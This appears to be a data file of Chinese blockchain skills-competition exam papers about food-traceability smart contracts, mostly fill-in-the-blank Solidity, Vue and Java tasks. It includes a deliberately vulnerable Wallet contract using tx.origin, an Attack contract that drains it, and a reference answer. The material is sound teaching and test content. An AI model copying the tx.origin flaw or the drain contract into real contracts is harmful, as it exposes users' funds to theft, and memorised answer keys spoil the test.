foodId;\n}\n```\n\n（2）编写食品溯源收购商创建收购订单功能。\n\n```javascript\n   function Buy(uint orderNo, ①, uint orderType,uint foodId, uint price, uint num) public returns(②) {\n        require(userRoleMap[msg.sender] == ③ || msg.sender == owner);\n        buyMap[buyNo] = Buys(orderNo,buyNo, orderType, foodId, price, num, now, ④);\n        return buyNo;\n}\n```\n\n（3）编写食品溯源创建运输订单功能。\n```javascript\nfunction Transport(uint orderNo, ①, uint orderType, uint num, string memory from_place, string memory to_place) public returns(②) {\n        require(userRoleMap[msg.sender] == ③ || msg.sender == owner);\n        transportMap[transportNo] = Transports(orderNo, transportNo, orderType, num, from_place, to_place, now，④ );\n        return transportNo;\n}\n```\n\n\n### 3.角色（Role）管理的接口编码（4分）\n（1）编写食品溯源增加角色接口，实现添加角色的功能。（1分）\n```javascript\nfunction addRole(address userAddress, uint role) public ①{\n        userRoleMap[②] = role;\n\t}\n```\n\n\n（2）编写食品溯源获取角色功能。（1分）\n```javascript\nfunction getUserRole(address userAddress) public view returns(①) {\n        uint role = userRoleMap[②];\n        return role;\n    }\n（3）编写食品溯源修改角色功能。（2分）\nfunction changeRole(address userAddress, uint newrole) public ①{\n        userRoleMap[userAddress] = newrole;\n        Member storage ②= memberMap[userAddress];\n        member.businessType = ③;\n        memberMap[userAddress] = ④;\n    }\n```\n\n### 4.合约编译、部署和调用（4分）\n（1）解决代码错误和警告，正确编译并部署合约，成功获取部署的合约地址和abi。（1分）\n\n（2）调用食品溯源智能合约的接口，完整验证业务流程。（3分）"}
{"id":7,"name":"2023年全国职业院校技能大赛 第一套","type":"国赛","vmList":["192.168.101.84","192.168.101.86","192.168.101.87"],"content":"# 2023年全国职业院校技能大赛 高职组\n\n \n\n \n\n## “区块链技术应用” 赛项赛卷（1卷）\n\n \n\n## 任\n\n## 务\n\n## 书\n\n \n\n## **背景描述**\n\n随着消费需求的增加以及消费品质的提升，消费者对食品安全的关注度越来越高，希望能参与食品的供应链管理，让每个环节能做到足够透明化。当前企业和消费者使用的传统供应链管理依靠中心化应用系统记录流转过程的相关数据，透明度比较低，而且容易被中心化机构篡改，消费者更无法确认其数据的真实性。此外，传统管理模式的多数环节之间信息流通不畅，数据无法共享，影响供应链管理效率。因此，食品供应链管理面临效率和安全透明的双重挑战，迫切需要有效变革，促进食品供应链管理更加高效、透明和安全。\n\n从区块链技术方面入手，区块链技术本身具有去中心化、公开透明、不可篡改等优点，可解决食品供应链管理的短板，与现行管理方案相结合，不仅可提升透明度，而且可提升管理效率。\n\n通过构建基于区块链技术的食品溯源管理平台，将食品在流转过程中的关键信息记录到区块链上，比如食品的生产日期、产地、质量以及数量等有关食品溯源的相关信息通过区块链的方式保存下来，有效保证了溯源数据的真实性。另一方面，在区块链的基础上结合智能合约技术，灵活设计食品溯源平台的核心业务，在确保数据安全的前提下实现透明公开，在此基础上引入食品监管机制有效保证生态良性发展。如下图所示为食品溯源平台的关键业务流程：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151609950.png)\n\n## 模块一：区块链产品方案设计及系统运维（35分）\n\n选手完成本模块的任务后，将任务中设计结果、运行代码、运行结果等截图粘贴至往后提交至答题U盘。\n\n### 任务1-1：区块链产品需求分析与方案设计（10分）\n\n航班延误险中涉及到乘客、航空公司、区块链系统平台、保险公司等参与方，他们需要在区块链系统平台中完成账户注册、身份上链、机票购买、保险购买等多种业务活动。通过对业务活动的功能分析，可以更好的服务系统的开发流程。基于航班延误险系统架构，以区块链航班延误系统为背景，结合账户注册、登录服务、入驻上链、购买机票等核心功能描述，撰写流程图/功能图、用例图等概要设计。本任务需要依据项目背景完成需求分析与方案设计，具体要求如下:\n\n \n\n1.依据给定的背景信息，对自动航班延迟赔偿需求进行分析，要求使用Y模型即需求场景、背后目标、产品功能进行分析；（3分）\n\n2.依据给定的背景信息，对考题进行核心业务分析，使用Visio工具编制系统业务流程图，包含乘机人获取延误险赔偿的核心业务流程、航空公司设置保险、提供航班信息的核心业务流程、保险公司根据航班延误条件自动执行赔偿的核心业务流程；（1.5分）\n\n3.依据给定的背景信息，对考题进行核心业务用例分析，使用Visio工具编制系统业务用例图，包含乘机人获取延误险赔偿的核心业务用例、航空公司设置保险、提供航班信息的核心业务用例、保险公司根据航班延误条件自动执行赔偿的核心业务用例；（1.5分）\n\n4.依据给定的背景信息，使用Visio工具编制业务系统功能结构图；（2分）\n\n5.依据给定的背景信息，使用表格编制业务系统功能清单。（2分）\n\n### 任务1-2：区块链系统部署与运维（15分）\n\n围绕食品安全溯源区块链平台部署与运维需求，进行项目相关系统、节点以及管理工具的部署工作。通过监控工具完成对网络、节点服务的监控。最终利用业务需求规范，完成系统日志、网络参数、节点服务等系统结构的维护，具体要求如下：\n\n1. 根据参数与端口设置要求，部署区块链系统并验证；\n\n2. 根据参数与端口设置要求，部署区块链网络管理平台并验证；\n\n3. 基于区块链系统相关管理平台，按照任务指南实施系统运维工作并验证；\n\n4. 基于区块链系统相关监管工具，按照任务指南对区块链系统进行监管。\n\n \n\n#### 子任务1-2-1： 搭建区块链系统并验证\n\n基于给定服务器环境以及软件，搭建一条双机1机构8节点1群组的区块链系统（默认端口开始）并验证，具体工作内容如下：\n\n（1）查看两台机器（M1-A，M1-B）的IP地址，并分别指定节点为（Node0—Node3）和（Node4—Node7）进行区块链网络搭建，机构为Agency1；\n\n（2）搭建过程中设置区块链网络的证书过期时间为90天；\n\n（3）通过命令检查区块链网络中所有节点的进程；\n\n（4）通过命令检查区块链网络中所有节点连接状态和共识状态。\n\n \n\n#### 子任务1-2-2：搭建区块链系统的命令行控制台并验证\n\n基于给定服务器环境以及软件，分别在机器（M1-A，M1-B）上搭建双机8节点1群组区块链网络的控制台并开展相关运维工作，具体工作内容如下：\n\n（1）为两台机器搭建并配置控制台，管理相关证书并验证启动；\n\n（2）使用机器（M1-A）的控制台部署HelloWorld智能合约；\n\n（3）使用机器（M1-B）的控制台完成HelloWorld智能合约中的set与get方法操作；\n\n（4）使用机器（M1-B）控制台检查区块链中的当前区块高度以及部署的智能合约地址。\n\n \n\n#### 子任务1-2-3：区块链节点运维\n\n基于已搭建的区块链系统与控制台，在机器（M1-A）上开展区块链群组与节点的运维工作，具体内容如下：\n\n（1）基于服务器环境中的扩容工具，在机器（M1-A）上进行新节点（Node8、Node9）扩容，在机器（M1-B）上进行新群组（Group2）和新节点（Node10、Node11）的扩容；\n\n（2）使用机器（M1-A）检查扩容完成的区块链节点（Node8、Node9）的连接状况以及新节点在群组（Group1）中的共识状态；\n\n（3）使用机器（M1-B）检查扩容完成的区块链节点（Node10、Node11）的连接状况和在新群组（Group2）中的共识状态。\n\n \n\n#### 子任务1-2-4：区块链网络运维\n\n基于已经部署的区块链网络与控制台，完成网络配置与管理运维操作，具体内容如下：\n\n（1）设置区块链系统黑名单，将机器（M1-A）上的node0设为黑名单禁止其它所有节点连接，并通过命令检查；\n\n（2）将区块链网络中最大交易数量设为5000；\n\n（3）通过控制台检查区块最大打包交易数量。\n\n\n\n### 任务1-3：区块链系统测试（10分）\n\n针对已经完成的区块链系统设计测试流程，结合实际业务的需求，调用智能合约的方法进行区块链系统性能测试；根据业务需求，对已经搭建的区块链系统进行可视化操作，测试区块链系统的基本功能。利用模拟业务和测试工具来完成对区块链系统服务数据的测试。基于机器（M1-A）进行以下操作：\n\n1. 针对部署完成的WeBASE管理平台，修改配置文件并启动服务，进行区块链系统的可视化测试，添加开发者用户以及进行邮件配置；\n\n2. 针对部署的区块链网络进行链管理服务的API接口测试；\n\n3. 针对给定工程项目中的Caliper测试工具，调用Transfer合约的方法进行压力测试，不少于两个方法的测试。具体要求如下：\n\n（1） 配置测试脚本；\n\n（2） 设置txNumber=1000，tps=1000，所有测试通过率为100%。\n\n4. 智能合约安全漏洞测试。\n\n有如下问题智能合约：\n\n```solidity\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\n \n\ncontract Wallet {\n\n  address public owner;\n\n \n\n  constructor() payable {\n\n​    owner = msg.sender;\n\n  }\n\n \n\n  function transfer(address payable _to, uint _amount) public {\n\n​    require(tx.origin == owner, \"Not owner\");\n\n​    (bool sent, ) = _to.call{value: _amount}(\"\");\n\n​    require(sent, \"Failed to send Ether\");\n\n  }\n\n}\n\n \n\ncontract Attack {\n\n  address payable public owner;\n\n  Wallet wallet;\n\n \n\n  constructor(Wallet _wallet) {\n\n​    wallet = Wallet(_wallet);\n\n​    owner = payable(msg.sender);\n\n  }\n\n \n\n  function attack() public {\n\n​    wallet.transfer(owner, address(wallet).balance);\n\n  }\n\n}\n```\n\n（1） 分析以上智能合约中存在的漏洞，并说明其可能造成的危害；\n\n（2） 编写测试用例，复现智能合约中存在的漏洞；\n\n（3） 创建修复后的智能合约，命名为setupRepair.sol，并编写测试用例修复结果，并说明修复内容。\n\n\n\n## 模块二：智能合约开发与测试（30分）\n\n选手完成本模块的任务后，将任务中设计结果、运行代码、运行结果等截图粘贴至平台答题区。\n\n### 任务2-1：智能合约设计（5分）\n\n根据区块链食品溯源应用需求分析和方案设计文档的描述，编写该区块链产品的智能合约功能需求文档，以及设计该智能合约UML图。具体要求如下：\n\n**1.编写区块链食品溯源智能合约功能需求文档**\n\n根据区块链食品溯源产品项目背景和需求分析，编写该区块链食品溯源产品的智能合约功能需求文档。\n\n**2.完成区块链食品溯源智能合约的设计图**\n\n设计区块链食品溯源智能合约接口，画出区块链食品溯源智能合约的角色UML用例图，以及画出区块链食品溯源各智能合约关系的时序图。\n\n### 任务2-2：智能合约开发（20分）\n\n使用Solidity语言完成智能合约开发、部署和调用，要求如下：\n\n1.食品信息（FoodInfoItem）的接口编码\n\n（1）编写食品信息实体的接口，完成可溯源食品信息初始化，实现可追溯的原始生产商食品信息上链功能；\n\n表2-2-1 FoodInfoItem实体说明\n\n| 名称              | 类型      | 说明         |\n| ----------------- | --------- | ------------ |\n| _currentTraceName | string    | 当前用户名   |\n| _name             | string    | 食品名称     |\n| _owner            | address   | 合约的创建者 |\n| _quality          | uint8     | 质量         |\n| _status           | uint8     | 状态         |\n| _traceName        | string[]  | 用户名       |\n| _timestamp        | uint[]    | 流转时间戳   |\n| _traceAddress     | address[] | 用户地址     |\n| _traceQuality     | uint8[]   | 食品质量     |\n\n```solidity\n contract FoodInfoItem{\n\n  //①保存食品流转过程中各个阶段的时间戳\n\n  //②保存食品流转过程各个阶段的用户名\n\n  //③保存食品流转过程各个阶段的用户地址信息（和用户一一对应）\n\n  //④保存食品流转过程中各个阶段的质量\n\n  //⑤食品名称\n\n  //⑥当前用户名称\n\n  //⑦质量（0=优质 1=合格 2=不合格）\n\n  //⑧状态（0:生产 1:分销 2:出售）\n\n  //⑨初始化owner\n```\n\n（2）编写分销商食品上链信息接口，根据食品溯源智能合约地址获取分销商上链食品的信息； \n\n```solidity\nfunction addTraceInfoByDistributor(①, uint8 quality) public returns(bool) {\n\n​    require(_status == 0 , \"status must be producing\");\n\n​    //②\n\n​    _timestamp.push(now);\n\n​    _traceName.push(traceName);\n\n​    _currentTraceName = traceName;\n\n​    //③\n\n​    //④\n\n​    _traceQuality.push(_quality);\n\n​    _status = 1;\n\n​    return true;\n\n  }\n```\n\n（3）编写超市进行食品上链信息的接口，根据食品溯源智能合约地址获取超市上链食品信息。\n\n```solidity\nfunction addTraceInfoByRetailer(①, uint8 quality) public returns(bool) {\n\n​    require(_status == 1 , \"status must be distributing\");\n\n​    //②\n\n​    _timestamp.push(now);\n\n​    _traceName.push(traceName);\n\n​    _currentTraceName = traceName;\n\n​    //③\n\n​    //④\n\n​    _traceQuality.push(_quality);\n\n​    _status = 2;\n\n​    return true;\n\n}\n```\n\n2.食品溯源(Trace)的接口编码\n\n（1）编写食品溯源智能合约生产商Producer添加食品接口，必须生产商才能添加可溯源的食品，实现溯源功能；\n\n```solidity\nfunction newFood(①, string traceName, uint8 quality)\n\n​\tpublic ② returns(③)\n\n​    {\n\n​      //④\n\n​      //⑤\n\n​      //⑥\n\n​      //⑦\n\n​      //⑧\n\n​    }\n```\n\n（2）编写食品溯源智能合约分销商Distributor添加食品接口，必须分销商才能添加可溯源的食品，实现溯源功能；\n\n```solidity\nfunction addTraceInfoByDistributor(①, uint8 quality)\n\n​\tpublic ② returns(bool) {\n\n​      //③\n\n​      return FoodInfoItem(foods[traceNumber]).④, quality);\n\n​    }\n\n（3）编写食品溯源智能合约超市Retailer添加食品接口，必须超市才能添加可溯源的食品，实现溯源功能。\n\nfunction addTraceInfoByRetailer(①, uint8 quality)\n\n​\tpublic ② returns(bool) {\n\n​      require(③, \"traceNumber does not exist\");\n\n​      return FoodInfoItem(foods[traceNumber]).④, quality);\n\n​    }\n```\n\n3.角色（Role）管理的接口编码\n\n（1）编写食品溯源增加角色接口，必须是未增加的角色才能被添加，实现添加角色的功能；\n\n```solidity\nfunction add(①, address account) ② {\n\n​    require(!③, \"Roles: account already has role\");\n\n​    role.④ = true;\n\n}\n```\n\n（2）编写食品溯源移除角色接口，必须是已增加的角色才能被移除，实现移除角色的功能； \n\n```solidity\nfunction remove(①, address account) ② {\n\n​    require(③, \"Roles: account does not have role\");\n\n​    role.④ = false;\n\n  }\n```\n\n（3）编写食品溯源角色授权接口，必须是授权的角色地址，实现角色权限管理功能。\n\n```solidity\nfunction has(①, address account) ② returns (bool) {\n\n​    require(③, \"Roles: account is the zero address\");\n\n​    return role.④;\n\n  }\n```\n\n4.合约编译、部署和调用\n\n（1）解决代码错误和警告，正确编译并部署合约，成功获取部署的合约地址和abi；\n\n（2）调用食品溯源智能合约的接口，完整验证业务流程。\n\n### 任务2-3：智能合约测试（5分）\n\n针对区块链食品溯源系统的背景描述，设计并编写智能合约测试用例，针对设计的智能合约测试用例，编写单元测试代码并完成合约功能测试，具体要求如下：\n\n1.设计并编写测试用例\n\n根据需求用例文档在以下测试用例表格中编写食品溯源系统的测试用例，测试用例不少于5个，新增的测试用例可在下表中补充。\n\n| 用例编号 | 用例标题              | 优先级 | 前置条件 | 测试步骤 | 测试数据 | 预期结果 | 测试结果 |\n| -------- | --------------------- | ------ | -------- | -------- | -------- | -------- | -------- |\n| SP-SY001 | 新增食品（溯源码为1） | 高     |          |          |          |          |          |\n| SP-SY002 | 查询食品（溯源码为1） | 高     |          |          |          |          |          |\n|          |                       |        |          |          |          |          |          |\n|          |                       |        |          |          |          |          |          |\n|          |                       |        |          |          |          |          |          |\n\n2.编写测试脚本\n\n根据编写完成的测试用例，配置区块链网络并编写测试脚本对智能合约的功能进行测试。\n\n \n\n## 模块三：区块链应用系统开发（30分）\n\n选手完成本模块的任务后，将任务中设计结果、运行代码、运行结果等截图粘贴至平台答题区。\n\n### 任务3-1：区块链应用前端功能开发（10分）\n\n1．请基于前端系统的开发模板，在登录组件以及组件管理文件LoginUser.vue中添加对应的逻辑代码，实现对前端的角色选择功能，并测试功能完整性，示例页面如下：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151609948.jpg) \n\n具体要求如下：\n\n（1）有明确的提示，提示用户选择角色；\n\n（2）用户可看到四个不同的角色可选（生产商、中间商、超市、消费者）；\n\n（3）每个用户所对应的组件请在LoginUser中找寻并填入；\n\n（4）页面顶部要有食品溯源平台的网站标题和logo。\n\nLoginUser.vue:\n\n代码片段1：\n\n```vue\n<!-- 角色选择 -->\n\n   <h3 v-if=\"选手填写部分\">请选择您的角色</h3>\n\n   <el-row :gutter=\"80\" v-if=\"选手填写部分\">\n\n​    <el-col :span=\"6\" v-for=\"选手填写部分\" :key=\"选手填写部分\">\n\n          <div @click=\"选手填写部分\">选手填写部分</div>\n\n​    </el-col>\n\n   </el-row>\n```\n\n代码片段2：\n\n// 用户身份\n\n```vue\n   users: [\n\n​    {\n\n​     name: 选手填写部分,\n\n​     userName: 'producer',\n\n​     component: 选手填写部分,\n\n​    },\n\n​    {\n\n​     name: 选手填写部分,\n\n​     userName: 'distributor',\n\n​     component: 选手填写部分,\n\n​    },\n\n​    {\n\n​     name: 选手填写部分,\n\n​     userName: 'retailer',\n\n​     component: 选手填写部分,\n\n​    },\n\n​    {\n\n​     name: 选手填写部分,\n\n​     userName: 'consumer',\n\n​     component: 选手填写部分,\n\n​    },\n\n   ],\n\n   currentUser: 选手填写部分, // 当前用户\n\n \n```\n\nHeaderV.vue:\n\n代码片段3：\n\n```vue\n\n<template>\n\n  <div class=\"header\">\n\n​    <img src=\"C:/Program%20Files/Typora/%E9%80%89%E6%89%8B%E5%A1%AB%E5%86%99%E9%83%A8%E5%88%86\" />\n\n  <h3>食品溯源平台</h3>\n\n  <span v-if=\"login\" class=\"user-name\">{{ 选手填写部分 }}</span>\n\n </div>\n\n</template>\n```\n\n \n\n2．请基于前端系统的开发模板，在登录组件以及组件管理文件LoginUser.vue中添加对应的逻辑代码，实现对前端的角色选择功能，并测试功能完整性，示例页面如下：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151609955.png) \n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151609961.png) \n\n具体要求如下：\n\n（1）点击角色进入相应角色登录页面；\n\n（2）登录界面提示用户的地址（消费者不显示），有登录操作的相关提示；\n\n（3）登录界面有5秒倒计时；\n\n（4）登录界面有“直接登录”按钮，点击可直接跳转到相应角色首页。\n\nLoginUser.vue:\n\n代码片段1：\n\n```vue\n<!-- 角色登录 -->\n\n<div v-else class=\"is-login\">\n\n  <h3>登录中......(倒计时：{{ 选手填写部分 }} 秒)</h3>\n\n   <div>角色: <span>{{ 选手填写部分}}</span> </div>\n\n<!-- 非消费者则显示角色地址 -->\n\n    <div v-if=\"选手填写部分\">角色地址: <span>{{ 选手填写部分 }}</span></div>\n\n  <!-- 直接登录按钮 -->\n\n  <el-button type=\"primary\" 选手填写部分>直接登录</el-button>\n\n </div>\n```\n\n代码片段2：\n\n//登录时有个5秒的倒计时，这里是在点击直接登录时，清楚倒计时，直接跳到相关页面\n\n```vue\n  clearTimer() {\n\n   clearInterval(选手填写部分);\n\n   选手填写部分\n\n  },\n\n  // 倒计时\n\n  countdownInterval() {\n\n   this.timer = setInterval(() => {\n\n​    if(this.countdown <= 0){\n\n​     选手填写部分;\n\n​    }\n\n​    选手填写部分;\n\n   }, 选手填写部分);\n\n  },\n```\n\n代码片段3：\n\n```vue\n//点击用户登录，获取用户地址\n\n  handleClick(item) {\n\n   this.loginItem = item;\n\n   // 处理消费者角色，其他三个角色都有一个角色地址\n\n   if (item.userName !== 选手填写部分) {\n\n​    axios({\n\n​     选手填写部分    \n\n})\n\n​    .then(ret => {\n\n​     this.address = 选手填写部分;\n\n​     this.currentUser = 选手填写部分;\n\n​     this.countdownInterval(选手填写部分);\n\n​    }) \n\n​    .catch(err => {\n\n​     console.log(err)\n\n​    })\n\n   } else {\n\n​    选手填写部分   \n\n }\n\n}\n```\n\n\n\n### 任务3-2：区块链应用后端功能开发（20分）\n\n1．请基于已有的项目，开发完善IndexController类，编写添加食品生产信息的方法，实现食品信息的添加功能，并测试功能完整性。\n\n本任务具体要求如下：\n\n（1）开发文件IndexController.java中的produce方法，请求接口为/produce；\n\n（2）开发文件IndexController.java中的produce方法，要求对前端传入的参数进行二次验证；\n\n（3）开发文件IndexController.java中的produce方法，要求封装返回值为String，但不返回视图页面。\n\nproduce方法:\n\n```java\n/**\n\n   \\* 添加食品生产信息\n\n   \\* traceNumber: 食品溯源id，食品溯源过程中的标识符\n\n   \\* foodName: 食物名称\n\n   \\* traceName: 用户名，食品流转过程各个阶段的用户名\n\n   \\* quality: 当前食品质量（0=优质 1=合格 2=不合格）\n\n   \\* @return：添加食品生产信息结果\n\n   */\n\n  @选手填写部分\n\n  @PostMapping(选手填写部分, produces=MediaType.APPLICATION_JSON_VALUE)\n\n  public String produce(@RequestBody JSONObject jsonParam) {\n\n​    //声明返回对象\n\n​    JSONObject _outPutObj = new JSONObject();\n\n \n\n​    //生产商生产食品\n\n​    if(jsonParam == null){\n\n​      选手填写部分\n\n​    }\n\n \n\n​    int trace_number = 选手填写部分;\n\n​    String food_name = 选手填写部分;\n\n​    String trace_name = 选手填写部分;\n\n​    int quality = 选手填写部分;\n\n \n\n​    JSONArray params = JSONArray.parseArray(\"[\\\"\"+food_name+\"\\\",\"+trace_number+\",\\\"\"+trace_name+\"\\\",\"+quality+\"]\");\n\n​    JSONObject _jsonObj = new JSONObject();\n\n​    _jsonObj.put(\"contractName\",CONTRACT_NAME);\n\n​    _jsonObj.put(\"contractAddress\",CONTRACT_ADDRESS);\n\n​    _jsonObj.put(\"contractAbi\",JSONArray.parseArray(CONTRACT_ABI));\n\n​    _jsonObj.put(\"user\",PRODUCER_ADDRESS);\n\n​    _jsonObj.put(\"funcName\",选手填写部分);\n\n​    _jsonObj.put(\"funcParam\",选手填写部分);\n\n \n\n​    String responseStr = httpPost(URL,选手填写部分);\n\n​    JSONObject responseJsonObj = JSON.parseObject(responseStr);\n\n​    String msg = responseJsonObj.getString(\"message\");\n\n​    if (msg.equals(\"Success\")){\n\n​      _outPutObj.put(\"ret\",选手填写部分);\n\n​      _outPutObj.put(\"msg\",msg);\n\n​    }else{\n\n​      _outPutObj.put(\"ret\",选手填写部分);\n\n​      _outPutObj.put(\"msg\",msg);\n\n​    }\n\n​    return 选手填写部分;\n\n  }\n```\n\n \n\n2．开发完善IndexController类，编写中间商添加食品流转信息的方法，实现中间商添加食品流转信息的功能，并测试功能完整性。\n\n具体要求如下：\n\n（1）开发文件IndexController.java中的add_trace_by_distrubutor方法，请求接口为/adddistribution；\n\n（2）开发文件IndexController.java中的add_trace_by_distrubutor方法，要求对前端传入的参数进行二次验证；\n\n（3）开发文件IndexController.java中的add_trace_by_distrubutor方法，要求封装返回值为String，但不返回视图页面；\n\nadd_trace_by_distrubutor方法:\n\n```java\n/**\n\n   \\* 中间商添加食品流转信息\n\n   \\* traceNumber: 食品溯源id，食品溯源过程中的标识符\n\n   \\* traceName: 用户名，食品流转过程各个阶段的用户名\n\n   \\* quality: 当前食品质量（0=优质 1=合格 2=不合格）\n\n   \\* @return：中间商添加食品流转信息结果\n\n   */\n\n  @选手填写部分\n\n  @PostMapping(选手填写部分, produces=MediaType.APPLICATION_JSON_VALUE)\n\n  public String add_trace_by_distrubutor(@RequestBody JSONObject jsonParam) {\n\n​    //声明返回对象\n\n​    JSONObject _outPutObj = new JSONObject();\n\n \n\n​    if(jsonParam == null){\n\n​      选手填写部分\n\n​    }\n\n \n\n​    String trace_number = 选手填写部分;\n\n​    String trace_name = 选手填写部分;\n\n​    int quality = 选手填写部分;\n\n \n\n​    JSONArray params = JSONArray.parseArray(\"[\"+trace_number+\",\\\"\"+trace_name+\"\\\",\"+quality+\"]\");\n\n​    JSONObject _jsonObj = new JSONObject();\n\n​    _jsonObj.put(\"contractName\",CONTRACT_NAME);\n\n​    _jsonObj.put(\"contractAddress\",CONTRACT_ADDRESS);\n\n​    _jsonObj.put(\"contractAbi\",JSONArray.parseArray(CONTRACT_ABI));\n\n​    _jsonObj.put(\"user\",DISTRIBUTOR_ADDRESS);\n\n​    _jsonObj.put(\"funcName\",选手填写部分);\n\n​    _jsonObj.put(\"funcParam\",选手填写部分);\n\n \n\n​    String responseStr = httpPost(URL,选手填写部分);\n\n​    JSONObject responseJsonObj = JSON.parseObject(responseStr);\n\n​    String msg = responseJsonObj.getString(\"message\");\n\n​    if (msg.equals(\"Success\")){\n\n​      _outPutObj.put(\"ret\",选手填写部分);\n\n​      _outPutObj.put(\"msg\",msg);\n\n​    }else{\n\n​      _outPutObj.put(\"ret\",选手填写部分);\n\n​      _outPutObj.put(\"msg\",msg);\n\n​    }\n\n \n\n​    return 选手填写部分;\n\n \n\n  }\n```\n\n3．请基于已有的项目，开发完善IndexController类，编写获取某个食品的溯源信息的方法，实现获取某个食品的溯源信息的功能，并测试功能完整性。\n\n具体要求如下：\n\n（1）开发文件IndexController.java中的trace方法，请求接口为/trace，该接口调用私有方法get_trace，不直接与合约交互，提高系统的安全性；\n\n（2）开发文件IndexController.java中的trace方法，对传入数据进行二次验证；\n\n（3）开发文件IndexController.java中的get_trace方法，要求通过合约进行溯源信息的查询，且外部无法直接调用；\n\n（4）开发文件IndexController.java中的trace方法，要求封装返回值为String，但不返回视图页面。\n\ntrace方法:\n\n```java\n \n\n  /**\n\n   \\* 获取某个食品的溯源信息\n\n   \\* @param traceNumber 食品溯源id，食品溯源过程中的标识符\n\n   \\* @return 对应食品的溯源信息\n\n   */\n\n  @选手填写部分\n\n  @GetMapping(选手填写部分, produces=MediaType.APPLICATION_JSON_VALUE)\n\n  public String trace(String traceNumber){\n\n \n\n​    JSONObject _outPut = new JSONObject();\n\n \n\n​    if (Integer.parseInt(traceNumber) <= 0){\n\n​      选手填写部分\n\n​    }\n\n \n\n​    List res = get_trace(traceNumber);\n\n​    JSONArray o = new JSONArray(res);\n\n​    return 选手填写部分;\n\n }\n\n \n\nget_trace方法：\n\n/**\n\n   \\* 从链上获取某个食品的溯源信息\n\n   \\* @param traceNumber 食品溯源id，食品溯源过程中的标识符\n\n   \\* @return 对应食品的溯源信息\n\n   */\n\n  选手填写部分JSONArray get_trace(String traceNumber){\n\n​    //获取食品基本信息\n\n​    JSONArray params = JSONArray.parseArray(\"[\"+traceNumber+\"]\");\n\n \n\n​    JSONObject _jsonObj = new JSONObject();\n\n​    _jsonObj.put(\"contractName\",CONTRACT_NAME);\n\n​    _jsonObj.put(\"contractAddress\",CONTRACT_ADDRESS);\n\n​    _jsonObj.put(\"contractAbi\",JSONArray.parseArray(CONTRACT_ABI));\n\n​    _jsonObj.put(\"user\",\"\");\n\n​    _jsonObj.put(\"funcName\",选手填写部分);\n\n​    _jsonObj.put(\"funcParam\",选手填写部分);\n\n \n\n​    String responseStr = httpPost(URL,选手填写部分);\n\n​    JSONArray food  = JSON.parseArray(responseStr);\n\n \n\n​    //获取食品溯源信息\n\n​    JSONObject _jsonObj2 = new JSONObject();\n\n​    _jsonObj2.put(\"contractName\",CONTRACT_NAME);\n\n​    _jsonObj2.put(\"contractAddress\",CONTRACT_ADDRESS);\n\n​    _jsonObj2.put(\"contractAbi\",JSONArray.parseArray(CONTRACT_ABI));\n\n​    _jsonObj2.put(\"user\",\"\");\n\n​    _jsonObj2.put(\"funcName\",选手填写部分);\n\n​    _jsonObj2.put(\"funcParam\",选手填写部分);\n\n \n\n​    String responseStr2 = httpPost(URL,选手填写部分);\n\n​    JSONArray traceInfoList  = JSON.parseArray(responseStr2);\n\n​    JSONArray time_list = 选手填写部分;\n\n​    JSONArray name_list = 选手填写部分;\n\n​    JSONArray address_list = 选手填写部分;\n\n​    JSONArray quality_list = 选手填写部分;\n\n \n\n​    JSONArray _outPut = new JSONArray();\n\n​    for (int i=0;i<time_list.size();i++){\n\n​      if (i==0){\n\n​        JSONObject _outPutObj = new JSONObject();\n\n​        _outPutObj.put(\"traceNumber\",选手填写部分);\n\n​        _outPutObj.put(\"name\",选手填写部分);\n\n​        _outPutObj.put(\"produce_time\",选手填写部分);\n\n​        _outPutObj.put(\"timestamp\",选手填写部分);\n\n​        _outPutObj.put(\"from\",选手填写部分);\n\n​        _outPutObj.put(\"quality\",选手填写部分);\n\n​        _outPutObj.put(\"from_address\",选手填写部分);\n\n​        _outPut.add(_outPutObj);\n\n​      }else{\n\n​        JSONObject _outPutObj = new JSONObject();\n\n​        _outPutObj.put(\"traceNumber\",选手填写部分);\n\n​        _outPutObj.put(\"name\",选手填写部分);\n\n​        _outPutObj.put(\"produce_time\",选手填写部分);\n\n​        _outPutObj.put(\"timestamp\",选手填写部分);\n\n​        _outPutObj.put(\"from\",选手填写部分);\n\n​        _outPutObj.put(\"to\",选手填写部分);\n\n​        _outPutObj.put(\"quality\",选手填写部分);\n\n​        _outPutObj.put(\"from_address\",选手填写部分);\n\n​        _outPutObj.put(\"to_address\",选手填写部分);\n\n​        _outPut.add(_outPutObj);\n\n​      }\n\n​    }\n\n​    return _outPut;\n\n  }\n```\n\n "}
{"id":8,"name":"智能合约漏洞 第一套","type":"国赛","vmList":["192.168.101.86"],"content":"# 智能合约漏洞 第一套\n\n## origin漏洞\n\n### （1）智能合约安全漏洞测试。（4分）\n\n有如下问题智能合约：\n\n```javascript\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        require(tx.origin == owner, \"Not owner\");\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        owner = payable(msg.sender);\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n```\n\n \n\n分析智能合约中存在问题，并说明危害。（1分）\n\n**参考答案：**\n\n`此智能合约存在tx.origin漏洞，即身份伪装攻击，tx.origin可以用来确定交易的发起者的身份，但是在合约调用过程中，发起者可能并不是合约期望的用户。该合约存在攻击者冒充其他用户或者执行恶意操作。`\n\n \n\n根据truffle工具中的代码文件，编写测试用例，复现智能合约中存在的漏洞。（1分）\n\n**参考答案：**\n\n在migrations文件夹中加入代码部署的执行代码：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624398.jpg) \n\n具体测试用例代码如下：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624400.jpg) \n\n当有如下执行返回说明复现成功：\n\n![img](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/202310151624403.jpg) \n\n \n\n  